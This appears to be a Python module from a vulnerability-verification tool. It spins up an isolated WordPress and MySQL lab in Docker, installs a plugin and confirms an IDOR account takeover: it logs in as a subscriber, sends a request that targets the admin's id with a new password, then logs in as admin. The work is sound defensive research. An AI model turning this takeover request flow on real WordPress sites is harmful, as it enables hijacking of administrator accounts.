"""Dynamic verifier: spins up a REAL, throwaway WordPress + MySQL in Docker, installs the fetched
plugin, and attempts the account-takeover an "missing-authorization"/"idor" hypothesis describes —
log in as the low-privilege user, send the crafted request against an admin account, and confirm by
actually logging in again with the new password. This is the live counterpart to the static PoC
webexploit.py builds and the source grounding websource.py does: everything up to here (classify,
fetch, grep, build PoC) is static; this module is the one piece that RUNS something, so it is kept
separate, Docker-gated, and torn down unconditionally.

Scope (deliberately narrow, matching binoracle's "no false positives" rule — broaden per-class over
time rather than claim more than this can prove): this verifies ONE concrete shape — a WordPress
plugin where an authenticated low-privilege user can change ANOTHER user's email/password because
the handler trusts a user-id parameter from the request instead of checking it against the session.
That is exactly the CVE-2026-5523 shape this was built against. It does not attempt SQLi/XSS/RCE/...
dynamically; those need different confirmation harnesses (see the module docstring's TODO list) and
are future work, not simulated here.

Honesty: `verified` is set to True ONLY when a SECOND, independent login — as the admin account,
with the password THIS run's crafted request set — succeeds against the live WordPress instance.
That is unambiguous proof of account takeover, not a 200 status code or a guess. Everything else
(fetch, plugin install, first login, the crafted request itself) is logged as evidence either way.

Requires a reachable Docker DAEMON (not just the `docker` CLI) — checked explicitly, since the CLI
can be installed with no daemon running (degrades honestly, NOT_APPLICABLE, same pattern as
autosrop_aarch64.py for a missing cross toolchain). Pulls wordpress/mysql/alpine images on first use
(internet needed for that one-time cost, same as `make pwn-image`); the WordPress instance itself is
published only on 127.0.0.1, on an isolated per-run Docker network, and is always torn down.
"""
from __future__ import annotations

import json
import os
import re
import secrets
import shutil
import subprocess
import time
from dataclasses import dataclass, field
from typing import Callable, List, Optional

_MYSQL_IMAGE = "mysql:5.7"
_WP_IMAGE = "wordpress:php8.2-apache"
_WPCLI_IMAGE = "wordpress:cli"
_ALPINE_IMAGE = "alpine:3.20"

_ID_HINTS = ("user_id", "uid", "id", "target", "target_id", "user")
_EMAIL_HINTS = ("email", "mail", "user_email")
_PASS_HINTS = ("pass", "password", "pwd", "user_pass")


@dataclass
class WpVerifyResult:
    ok: bool = False                 # el flujo corrio hasta el final sin errores de infraestructura
    available: bool = True           # False si ni se pudo intentar (sin Docker daemon, etc.)
    verified: bool = False           # SOLO True si el segundo login con la nueva password funciono
    detail: str = ""
    logs: List[str] = field(default_factory=list)
    limitations: List[str] = field(default_factory=list)


def _run(cmd: List[str], timeout: float = 60.0, input_text: str = None) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, input=input_text)


def _docker_daemon_ok(timeout: float = 8.0) -> bool:
    """A mano de _docker_image_ok en _sandbox.py: el binario `docker` puede existir sin que el
    DAEMON este arriba (exactamente lo que pasa en este propio sandbox de desarrollo), asi que se
    comprueba de verdad con un comando real y acotado, nunca solo shutil.which."""
    if not shutil.which("docker"):
        return False
    try:
        return _run(["docker", "info"], timeout=timeout).returncode == 0
    except subprocess.TimeoutExpired:
        return False
    except Exception:
        return False


def _pick_param(params, hints) -> Optional[str]:
    """Elige el nombre de parametro mas probable para un rol (id/email/password) entre los que
    cito el LLM, por coincidencia de substring contra una lista de pistas ordenada por prioridad."""
    if not params:
        return None
    names = list(params.keys()) if isinstance(params, dict) else list(params)
    low = {n: n.lower() for n in names}
    for h in hints:
        for n, l in low.items():
            if h in l:
                return n
    return None


def _token() -> str:
    return secrets.token_hex(4)


class _Lab:
    """Agrupa los recursos Docker efimeros de una verificacion (red/volumen/contenedores) y
    garantiza su limpieza. Nunca deja nada vivo, tampoco si algo falla a mitad de camino."""

    def __init__(self, tag: str):
        self.tag = tag
        self.net = f"binoracle-wpverify-{tag}"
        self.vol = f"binoracle-wpverify-{tag}-html"
        self.mysql = f"binoracle-wpverify-{tag}-db"
        self.wp = f"binoracle-wpverify-{tag}-wp"
        self._created: List[str] = []
        self._db_env: List[str] = []   # -e flags reusados por wp_cli() (ver nota en wp_cli)

    def sh(self, *args, timeout=60.0, input_text=None):
        return _run(["docker"] + list(args), timeout=timeout, input_text=input_text)

    def setup_network_and_volume(self):
        self.sh("network", "create", self.net, timeout=30)
        self._created.append(("network", self.net))
        self.sh("volume", "create", self.vol, timeout=30)
        self._created.append(("volume", self.vol))

    def start_mysql(self, root_pw: str, db_pw: str):
        self.sh("run", "-d", "--name", self.mysql, "--network", self.net,
               "-e", f"MYSQL_ROOT_PASSWORD={root_pw}", "-e", "MYSQL_DATABASE=wordpress",
               "-e", "MYSQL_USER=wordpress", f"-e", f"MYSQL_PASSWORD={db_pw}", _MYSQL_IMAGE,
               timeout=90)
        self._created.append(("container", self.mysql))

    def mysql_ready(self, db_pw: str, tries: int = 40, delay: float = 2.0) -> bool:
        for _ in range(tries):
            r = self.sh("exec", self.mysql, "mysqladmin", "ping", "-uwordpress",
                       f"-p{db_pw}", "-h", "127.0.0.1", timeout=10)
            if r.returncode == 0:
                return True
            time.sleep(delay)
        return False

    def start_wordpress(self, db_pw: str) -> Optional[str]:
        """Publica el puerto 80 SOLO en 127.0.0.1 (nunca 0.0.0.0): el laboratorio no debe ser
        alcanzable desde fuera de este host. Devuelve el puerto publicado del host, o None."""
        # Guardadas para reusar en wp_cli(): wp-config.php (de la imagen oficial) lee estas
        # variables en TIEMPO DE EJECUCION via getenv_docker(), no las hornea en el fichero. El
        # contenedor wp-cli es OTRO contenedor (solo comparte el volumen, no el entorno del
        # contenedor de Apache), asi que sin pasarselas tambien a el, getenv_docker() cae a su
        # valor por defecto ('mysql') y wp-cli intenta conectar a un host que no existe.
        self._db_env = ["-e", f"WORDPRESS_DB_HOST={self.mysql}", "-e", "WORDPRESS_DB_NAME=wordpress",
                        "-e", "WORDPRESS_DB_USER=wordpress", "-e", f"WORDPRESS_DB_PASSWORD={db_pw}"]
        self.sh("run", "-d", "--name", self.wp, "--network", self.net,
               "-v", f"{self.vol}:/var/www/html", *self._db_env,
               "-p", "127.0.0.1::80", _WP_IMAGE, timeout=90)
        self._created.append(("container", self.wp))
        r = self.sh("port", self.wp, "80", timeout=15)
        m = re.search(r":(\d+)\s*$", (r.stdout or "").strip())
        return m.group(1) if m else None

    def http_ready(self, port: str, tries: int = 40, delay: float = 2.0) -> bool:
        import urllib.request
        url = f"http://127.0.0.1:{port}/wp-login.php"
        for _ in range(tries):
            try:
                with urllib.request.urlopen(url, timeout=5) as r:
                    if r.status < 500:
                        return True
            except Exception:
                pass
            time.sleep(delay)
        return False

    def wp_cli(self, *args, timeout=120.0) -> subprocess.CompletedProcess:
        return self.sh("run", "--rm", "--network", self.net, "-v", f"{self.vol}:/var/www/html",
                       *self._db_env, "--user", "33:33", _WPCLI_IMAGE, "wp", "--path=/var/www/html",
                       *args, timeout=timeout)

    def install_plugin(self, host_plugin_dir: str, slug: str, timeout=60.0) -> bool:
        """Copia el plugin (ya descargado a `host_plugin_dir`, que contiene <slug>/...) dentro del
        volumen compartido via un contenedor Alpine efimero. No usa el host directamente: Docker
        Desktop en Mac resuelve los bind mounts igual, sea Linux o macOS el host."""
        r = self.sh("run", "--rm", "-v", f"{self.vol}:/var/www/html",
                   "-v", f"{host_plugin_dir}:/src:ro", _ALPINE_IMAGE, "sh", "-c",
                   f"mkdir -p /var/www/html/wp-content/plugins && "
                   f"cp -r /src/{slug} /var/www/html/wp-content/plugins/{slug}",
                   timeout=timeout)
        return r.returncode == 0

    def teardown(self):
        for kind, name in reversed(self._created):
            try:
                if kind == "container":
                    self.sh("rm", "-f", name, timeout=30)
                elif kind == "network":
                    self.sh("network", "rm", name, timeout=15)
                elif kind == "volume":
                    self.sh("volume", "rm", "-f", name, timeout=15)
            except Exception:
                pass


def _wp_login(base_url: str, user: str, password: str, timeout: float = 15.0):
    """Login real por cookie de WordPress (wp-login.php). Devuelve una requests.Session logueada,
    o None si no hay cookie de sesion (login fallido). Requiere la libreria `requests` (pwntools ya
    la arrastra como dependencia, asi que esta presente donde el resto del motor de exploits lo esta)."""
    import requests
    s = requests.Session()
    try:
        r = s.post(f"{base_url}/wp-login.php",
                  data={"log": user, "pwd": password, "wp-submit": "Log In",
                        "redirect_to": f"{base_url}/wp-admin/", "testcookie": "1"},
                  timeout=timeout, allow_redirects=True)
    except Exception:
        return None
    logged_in = any(c.name.startswith("wordpress_logged_in_") for c in s.cookies)
    return s if logged_in else None


def verify_wordpress_account_takeover(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, id_param_hint: str = "", email_param_hint: str = "", pass_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 600.0,
) -> WpVerifyResult:
    """Levanta WordPress+MySQL en Docker, instala el plugin ya descargado en `plugin_source_dir`
    (debe contener `<slug>/...`), crea un usuario subscriber y un admin, inicia sesion como el
    subscriber y envia la peticion de `endpoint`/`http_method`/`parameters` apuntando al ID del
    admin con un email/password nuevos. `verified=True` SOLO si un login posterior como admin con
    la password nueva funciona de verdad. Siempre desmonta el laboratorio al terminar."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    t0 = time.time()

    if not _docker_daemon_ok():
        res.available = False
        # distingue las dos causas reales (el mensaje anterior asumia SIEMPRE "CLI presente, falta
        # el daemon", enganoso cuando el CLI ni siquiera esta instalado en la imagen).
        if not shutil.which("docker"):
            res.detail = "sin cliente docker instalado"
            res.limitations.append("verificacion dinamica NO intentada: el CLI de `docker` no "
                                   "esta instalado en este contenedor (reconstruye la imagen: "
                                   "`docker compose up --build`, ya deberia traerlo)")
        else:
            res.detail = "sin daemon Docker alcanzable"
            res.limitations.append("verificacion dinamica NO intentada: el CLI de docker esta, "
                                   "pero no se alcanza ningun daemon. Si corres binoracle dentro "
                                   "de Docker, monta el socket del host en docker-compose.yml "
                                   "(/var/run/docker.sock:/var/run/docker.sock) y confirma que "
                                   "Docker Desktop/dockerd esta arrancado en tu maquina")
        return res

    if not os.path.isdir(os.path.join(plugin_source_dir, slug)):
        res.detail = f"no se encuentra {slug}/ dentro de {plugin_source_dir}"
        res.limitations.append("el codigo del plugin no tiene la forma esperada (<slug>/...)")
        return res

    id_param = id_param_hint or _pick_param(parameters, _ID_HINTS)
    email_param = email_param_hint or _pick_param(parameters, _EMAIL_HINTS)
    pass_param = pass_param_hint or _pick_param(parameters, _PASS_HINTS)
    if not id_param or not (email_param or pass_param):
        res.detail = "no se identifico un parametro de ID y de email/password en la hipotesis"
        res.limitations.append("la verificacion de account-takeover necesita saber que parametro "
                               "lleva el ID objetivo y cual el email/password nuevos; afina "
                               "'parameters' en la hipotesis del LLM o pasalos a mano")
        return res

    lab = _Lab(_token())
    root_pw, db_pw = secrets.token_urlsafe(16), secrets.token_urlsafe(16)
    admin_user, admin_pass = "binoracle_admin", secrets.token_urlsafe(12)
    sub_user, sub_pass = "binoracle_subscriber", secrets.token_urlsafe(12)
    new_email = f"takeover-{_token()}@binoracle-lab.invalid"
    new_pass = secrets.token_urlsafe(12)

    def remaining():
        return budget_s - (time.time() - t0)

    try:
        step("levantando laboratorio WordPress+MySQL aislado en Docker (red/volumen propios)...")
        lab.setup_network_and_volume()
        lab.start_mysql(root_pw, db_pw)
        if not lab.mysql_ready(db_pw):
            res.detail = "MySQL no respondio a tiempo"
            return res
        step("MySQL listo; arrancando WordPress...")
        port = lab.start_wordpress(db_pw)
        if not port:
            res.detail = "no se pudo publicar el puerto de WordPress"
            return res
        if not lab.http_ready(port):
            res.detail = "WordPress no respondio a tiempo"
            return res
        base_url = f"http://127.0.0.1:{port}"
        step(f"WordPress listo en {base_url}; instalando core via wp-cli...")

        r = lab.wp_cli("core", "install", f"--url={base_url}", "--title=binoracle-lab",
                       f"--admin_user={admin_user}", f"--admin_password={admin_pass}",
                       "--admin_email=admin@binoracle-lab.invalid", "--skip-email", timeout=90)
        if r.returncode != 0:
            res.detail = f"wp core install fallo: {(r.stderr or r.stdout or '')[:300]}"
            return res
        admin_id = lab.wp_cli("user", "get", admin_user, "--field=ID", timeout=30).stdout.strip()
        step(f"WordPress instalado; admin id={admin_id}")

        step(f"copiando el plugin ({slug}) al volumen e instalandolo...")
        if not lab.install_plugin(plugin_source_dir, slug):
            res.detail = "no se pudo copiar el plugin al laboratorio"
            return res
        r = lab.wp_cli("plugin", "activate", slug, timeout=60)
        if r.returncode != 0:
            res.detail = f"activacion del plugin fallo: {(r.stderr or r.stdout or '')[:300]}"
            res.limitations.append("si el slug/version descargados no coinciden con el afectado, "
                                   "la activacion puede fallar por requisitos del propio plugin")
            return res
        step("plugin activo. Creando el usuario de bajo privilegio (subscriber)...")

        r = lab.wp_cli("user", "create", sub_user, "subscriber@binoracle-lab.invalid",
                       "--role=subscriber", f"--user_pass={sub_pass}", timeout=30)
        if r.returncode != 0:
            res.detail = f"creacion del subscriber fallo: {(r.stderr or r.stdout or '')[:300]}"
            return res

        if remaining() < 30:
            res.detail = "presupuesto de tiempo agotado antes de intentar el ataque"
            return res

        step(f"iniciando sesion como '{sub_user}' (bajo privilegio)...")
        sess = _wp_login(base_url, sub_user, sub_pass)
        if sess is None:
            res.detail = "no se pudo iniciar sesion como el usuario de bajo privilegio"
            return res
        res.logs.append(f"login subscriber: OK ({sub_user})")

        payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
        payload[id_param] = admin_id
        if email_param:
            payload[email_param] = new_email
        if pass_param:
            payload[pass_param] = new_pass
        m = (http_method or "POST").upper()
        step(f"enviando la peticion {m} {endpoint} dirigida al admin (id={admin_id})...")
        try:
            resp = sess.request(m, base_url + endpoint,
                               data=payload if m != "GET" else None,
                               params=payload if m == "GET" else None, timeout=20)
            res.logs.append(f"peticion enviada: {resp.status_code}")
        except Exception as e:
            res.detail = f"fallo enviando la peticion: {e}"
            return res

        step("confirmando: intentando iniciar sesion como admin con la password nueva..." )
        confirm = _wp_login(base_url, admin_user, new_pass) if pass_param else None
        if confirm is not None:
            res.verified = True
            res.ok = True
            res.detail = (f"ACCOUNT TAKEOVER confirmado: login como '{admin_user}' con la password "
                          f"fijada por la peticion funciono de verdad (admin_id={admin_id})")
            step("VERIFICADO: el login como admin con la password nueva funciono.")
            return res

        # si no hay pass_param (solo email, p.ej.), confirma por wp-cli leyendo el email actual
        if email_param and not pass_param:
            cur = lab.wp_cli("user", "get", admin_id, "--field=user_email", timeout=20).stdout.strip()
            res.ok = True
            res.verified = (cur == new_email)
            res.detail = (f"email del admin tras la peticion: {cur!r} "
                          f"(esperado: {new_email!r}) -> {'COINCIDE' if res.verified else 'no coincide'}")
            return res

        res.ok = True
        res.detail = "la peticion se envio pero no se pudo confirmar el efecto (login posterior fallo)"
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red/volumen)...")
        lab.teardown()
